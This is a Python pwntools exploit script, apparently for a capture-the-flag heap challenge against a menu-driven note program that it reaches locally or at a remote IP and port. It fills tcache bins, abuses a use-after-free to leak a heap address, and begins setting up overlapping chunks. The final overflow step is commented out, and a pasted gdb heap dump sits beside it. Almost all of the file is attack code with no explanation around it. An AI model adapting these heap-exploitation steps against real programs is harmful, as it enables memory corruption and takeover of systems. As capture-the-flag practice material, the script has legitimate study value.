#!/usr/bin/python3  

from pwn import *
DEBUG = False
LOCAL = True
def binary_connect():
    if LOCAL:
        if DEBUG:
            p = gdb.debug('./a.out', '''
                break *0x5555555557ff:
                continue
            ''')
        else:
            p = process('./a.out')

    else:
        p = remote('34.136.150.230', 49153)

    return p

def exploit():
    def add(index, len, val):
        p.send(b'1\n' + str(index).encode('utf-8') + b'\n' + str(len).encode('utf-8') + b'\n' + val.encode('utf-8') + b'\n')
        p.recvuntil(b'> ')
    
    def show(index):
        p.send('2\n' + str(index) + '\n')
        return (p.recvuntil(b'> '))
    
    def edit(index, len, val):
        p.send(b'3\n' + str(index).encode('utf-8') + b'\n' + str(len).encode('utf-8') + b'\n' + val.encode('utf-8') + b'\n')
        p.recvuntil(b'> ')

    def delete(index):
        p.send(b'4\n' + str(index).encode('utf-8') + b'\n')
        p.recvuntil(b'> ')

    def save(index):
        p.send(b'5\n' + str(index).encode('utf-8') + b'\n')
        p.recvuntil(b'> ')


    e = ELF('./libc.so.6')
    r = ROP(e)
    p = binary_connect()
    p.recvuntil(b'> ')

    pause()

    # alloc target index 1, 2 and fill up tcache bins for 0x70
    add(1, 0x60, "A" * 0x60)
    add(2, 0x60, "B" * 0x60)
    add(15, 0x60, "Z" * 0x60)
    add(14, 0x60, "Y" * 0x60)
    add(13, 0x60, "X" * 0x60)
    add(12, 0x60, "W" * 0x60)
    add(11, 0x60, "V" * 0x60)
    add(10, 0x60, "U" * 0x60)
    add(9, 0x60, "T" * 0x60)
    delete(15)
    delete(14)
    delete(13)
    delete(12)
    delete(11)
    delete(10)
    delete(9)

    # leak heap address - UAF used on index 1, which will have fw ptr pointing to freed chunk @ index 2
    save(1)
    delete(2)
    delete(1)
    pause()
    heap_leak = show(1)
    # if LOCAL:  # correct weird receive bug when remote
    #     heap_leak = p.recv()
    heap_leak = heap_leak.split(b'data: ')[1][0:6]
    heap_addr = hex(int.from_bytes(heap_leak, "little"))
    print(heap_addr)
    
    # consolidate free chunks, allocate 0x20 in fourth index to overlap with UAF index 1    
    add(3, 4000, 'C' * 4000)
    delete(3)
    add(4, 0x10, 'D' * 0x10)

    # add chunk to be expanded and barrier chunk to avoid consolidation
    add(5, 0x10, 'E' * 0x10)
    add(6, 0x10, 'F' * 0x10)
    delete(5)

    # expand index 5 with overflow from index 1. Update fw and bk pointers in index 1
    # edit(1, )
    '''
    # overlap index 1 and 2, so editing index 1 will overflow index 2
    add(1, 2000, "A" * 20)
    save(1)
    delete(1)
    add(2, 20, "B" * 10)
    add(3, 20, 'C'*20)
    add(4, 20, 'D'*20)
    delete(3)

    0x555555559280: 0x0000000000000000      0x0000000000000000
    0x555555559290: 0x0000000000000000      0x0000000000000051
    0x5555555592a0: 0x00005555555592e0      0x4141414141414141
    0x5555555592b0: 0x4141414141414141      0x4141414141414141
    0x5555555592c0: 0x4141414141414141      0x4141414141414141
    0x5555555592d0: 0x4141414141414141      0x0041414141414141
    0x5555555592e0: 0x0000000000000000      0x0000000000000051
    0x5555555592f0: 0x0000000000000000      0x4242424242424242
    0x555555559300: 0x4242424242424242      0x4242424242424242
    0x555555559310: 0x4242424242424242      0x4242424242424242
    '''

    p.interactive()

if __name__ == "__main__":
    context.log_level = 'debug'
    exploit()